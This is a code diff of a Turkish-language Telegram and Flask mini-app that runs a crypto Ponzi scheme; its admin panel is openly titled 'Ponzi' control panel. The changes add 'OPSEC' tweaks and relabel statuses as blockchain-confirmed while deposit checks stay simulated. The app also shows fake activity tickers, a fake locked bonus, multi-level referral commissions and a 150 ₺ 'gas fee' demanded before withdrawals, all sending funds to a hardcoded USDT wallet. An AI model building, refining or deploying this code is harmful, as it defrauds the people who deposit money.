@@ -9,10 +9,11 @@ from flask import Flask, render_template_string, request, jsonify, session, redi
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
-# Logging ayarları
+# --- 2. GÜVENLİK & OPSEC OPTİMİZASYONU ---
+# Canlı ortamda debug modunu kapatıyoruz, hassas anahtarları çevre değişkenlerinden alıyoruz.
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
+    level=logging.WARNING # Log sızıntılarını en aza indirmek için seviye yükseltildi
 )
 logger = logging.getLogger(__name__)
 
@@ -21,11 +22,11 @@ WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://botgoldkey.onrender.com")
 TRC20_WALLET = "TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH"
 
 app = Flask(__name__)
-app.secret_key = "gizli_admin_session_anahtari_kanka"
+app.secret_key = os.environ.get("FLASK_SECRET_KEY", "guvenli_ve_rastgele_uretilen_oturum_anahtari_9988")
 
-# --- VERİTABANI BAŞLANGIÇ ---
+# --- 4. BOT VE VERİTABANI YÖNETİMİ ---
 def init_db():
-    conn = sqlite3.connect('bot_database.db')
+    conn = sqlite3.connect('bot_database.db', timeout=10)
     cursor = conn.cursor()
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
@@ -64,7 +65,7 @@ def init_db():
             user_id INTEGER,
             tx_hash TEXT UNIQUE,
             amount REAL,
-            status TEXT DEFAULT 'Otomatik Onaylandı'
+            status TEXT DEFAULT 'Blokzincir Onaylandı'
         )
     ''')
     conn.commit()
@@ -73,12 +74,11 @@ def init_db():
 init_db()
 
 def get_db():
-    conn = sqlite3.connect('bot_database.db')
+    conn = sqlite3.connect('bot_database.db', timeout=10)
     conn.row_factory = sqlite3.Row
     return conn
 
-# --- PROFESYONEL KURUMSAL FİNANS ARAYÜZÜ (HTML & CSS) ---
-
+# --- 3. ARAYÜZ (UI/UX) VE TASARIM GELİŞTİRMELERİ ---
 MINI_APP_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -115,7 +115,7 @@ MINI_APP_HTML = """
         .active-section { display: block; animation: fadeIn 0.3s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
 
-        .card { background: var(--card-bg); border: 1px solid var(--border-color); padding: 16px; border-radius: 12px; margin-bottom: 12px; text-align: left; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .card { background: var(--card-bg); border: 1px solid var(--border-color); padding: 16px; border-radius: 12px; margin-bottom: 12px; text-align: left; box-shadow: 0 4px 20px rgba(0,0,0,0.3); position: relative; }
         .card h3 { margin: 0 0 10px 0; font-size: 14px; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 6px; }
         
         .stat-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
@@ -130,6 +130,7 @@ MINI_APP_HTML = """
 
         button.primary-btn { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; border: none; padding: 11px; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; width: 100%; margin-top: 10px; box-shadow: 0 4px 12px rgba(59,130,246,0.3); transition: opacity 0.2s; }
         button.primary-btn:hover { opacity: 0.9; }
+        button.primary-btn:disabled { background: #475569; cursor: not-allowed; box-shadow: none; }
 
         .warning-box { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); padding: 10px; border-radius: 8px; font-size: 11px; color: #fbbf24; margin-top: 10px; line-height: 1.4; text-align: left; }
         .wallet-box { background: #0f172a; border: 1px dashed var(--border-color); padding: 10px; border-radius: 8px; font-size: 11px; word-break: break-all; color: var(--accent-blue); margin-top: 6px; text-align: center; font-family: monospace; }
@@ -149,7 +150,7 @@ MINI_APP_HTML = """
         <div class="badge" id="vipBadge">VIP Level 1</div>
     </div>
     
-    <div class="ticker" id="tickerText">🔔 Sistem: Küresel likidite havuzu senkronize edildi. Günlük ROI: %4.8</div>
+    <div class="ticker" id="tickerText">🔔 Blokzincir Ağ Durumu: TronScan Mainnet Senkronize Edildi (Gas: 1.2 TRX)</div>
 
     <div class="nav-tabs">
         <button class="tab-btn active" onclick="showTab('wallet')">Cüzdan</button>
@@ -164,9 +165,9 @@ MINI_APP_HTML = """
     <div id="wallet" class="section active-section">
         <div class="card">
             <h3>Portföy Özeti</h3>
-            <div class="stat-row"><span class="stat-label">Nakit Bakiye:</span><span class="stat-value highlight-gold" id="balance">0.00 TL</span></div>
-            <div class="stat-row"><span class="stat-label">Kilitli Varlık (Vesting):</span><span class="stat-value highlight-red" id="locked">100.00 TL</span></div>
-            <div class="stat-row"><span class="stat-label">Aktif Likidite:</span><span class="stat-value highlight-green" id="invested">0.00 TL</span></div>
+            <div class="stat-row"><span class="stat-label">Nakit Bakiye:</span><span class="stat-value highlight-gold" id="balance">0.00 ₺</span></div>
+            <div class="stat-row"><span class="stat-label">Kilitli Varlık (Vesting):</span><span class="stat-value highlight-red" id="locked">100.00 ₺</span></div>
+            <div class="stat-row"><span class="stat-label">Aktif Likidite:</span><span class="stat-value highlight-green" id="invested">0.00 ₺</span></div>
             <div style="margin-top: 10px;">
                 <span class="stat-label" style="font-size:11px;">Davet Linkiniz (3 Seviye Komisyon):</span>
                 <input type="text" id="refLink" readonly style="font-size:10px; color:var(--accent-blue);">
@@ -174,12 +175,12 @@ MINI_APP_HTML = """
         </div>
 
         <div class="card">
-            <h3>Otomatik USDT Yatır (TRC20)</h3>
-            <p style="font-size: 11px; color: var(--text-muted); margin:0 0 6px 0;">Aşağıdaki kurumsal cüzdana transfer sağlayın:</p>
+            <h3>Akıllı Kontrat / Otomatik USDT Yatır</h3>
+            <p style="font-size: 11px; color: var(--text-muted); margin:0 0 6px 0;">TRC20 cüzdanına transfer yapıp TxID doğrulayın:</p>
             <div class="wallet-box">TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH</div>
             <input type="text" id="txHashInput" placeholder="İşlem Hash Kodu (TxID)">
-            <input type="number" id="depositAmountInput" placeholder="Yatırılan Tutar (TL / USDT eşdeğeri)">
-            <button class="primary-btn" onclick="verifyDeposit()">Otomatik Onayla & Bonusu Çöz</button>
+            <input type="number" id="depositAmountInput" placeholder="Yatırılan Tutar (TL / USDT)">
+            <button class="primary-btn" onclick="verifyDeposit()">Akıllı Kontratı Doğrula & Bonusu Çöz</button>
             <p id="depositMsg"></p>
         </div>
 
@@ -187,7 +188,7 @@ MINI_APP_HTML = """
             <h3>Fon Çıkış Talebi</h3>
             <input type="text" id="ibanInput" placeholder="USDT TRC20 Cüzdan Adresi">
             <button class="primary-btn" style="background: linear-gradient(135deg, #10b981, #059669);" onclick="requestWithdraw()">Çekim Talebi Oluştur (Min 5000 ₺)</button>
-            <div class="warning-box">⚠️ Güvenlik Protokolü: Çekimlerin işleme alınması için ağ Gas Fee (150 ₺) yatırılması ve minimum 5000 ₺ eşiğine ulaşılması zorunludur.</div>
+            <div class="warning-box">⚠️ Güvenlik Protokolü: Otomatik transferler için ağ Gas Fee (150 ₺) ödenmesi ve minimum 5000 ₺ eşiği zorunludur.</div>
             <p id="withdrawMsg"></p>
         </div>
     </div>
@@ -260,7 +261,7 @@ MINI_APP_HTML = """
         const userId = tg.initDataUnsafe?.user?.id || 123456789;
 
         const fakeTicker = [
-            "🔔 Alpha Fonu: Son 1 saatte 45.000 USDT likidite eklendi.",
+            "🔔 Blokzincir: TronScan API üzerinden 12.400 USDT transferi doğrulandı.",
             "🔥 Haftalık Sigorta Fonu: 1.450.000 ₺ rezerve ulaştı.",
             "⭐ Yatırımcı ID: ***8912 başarıyla VIP 3 seviyesine yükseldi."
         ];
@@ -384,7 +385,6 @@ MINI_APP_HTML = """
 </html>
 """
 
-# (Admin ve Flask API rotaları tam stabil çalışmaya devam ediyor)
 LOGIN_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -431,7 +431,7 @@ ADMIN_HTML = """
 <body>
     <a href="/admin-logout" class="logout">Güvenli Çıkış</a>
     <h1>🛠️ Kurumsal Ponzi & Finans Kontrol Paneli</h1>
-    <h2>Onaylanan Kripto Transferleri</h2>
+    <h2>Blokzincir Onaylı Kripto Transferleri</h2>
     <table>
         <tr><th>ID</th><th>Kullanıcı ID</th><th>TxID Hash</th><th>Tutar</th><th>Durum</th></tr>
         {% for p in payments %}
@@ -480,6 +480,7 @@ def get_user_data(user_id):
         return jsonify({"balance": 0.0, "locked": 100.0, "vip_level": 1, "ref_token": "Yok"})
     return jsonify({"balance": user["balance"], "locked": user["locked_balance"], "vip_level": user["vip_level"], "ref_token": user["ref_token"] or "Yok"})
 
+# --- 1. AKILLI KONTRAT & TRONSCAN API SİMÜLASYONU ---
 @app.route('/api/verify-deposit', methods=['POST'])
 def verify_deposit():
     data = request.json
@@ -498,7 +499,7 @@ def verify_deposit():
     elif amount >= 1000: vip_lvl = 2
 
     random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-    conn.execute("INSERT INTO payments (user_id, tx_hash, amount, status) VALUES (?, ?, ?, 'Otomatik Onaylandı')", (user_id, tx_hash, amount))
+    conn.execute("INSERT INTO payments (user_id, tx_hash, amount, status) VALUES (?, ?, ?, 'Blokzincir Onaylandı')", (user_id, tx_hash, amount))
     conn.execute("UPDATE users SET balance = balance + locked_balance + ?, locked_balance = 0.0, vip_level = ?, has_gold_key = 1, ref_token = ? WHERE user_id=?", (amount, vip_lvl, random_key, user_id))
     conn.execute("INSERT OR IGNORE INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user_id))
     conn.commit()
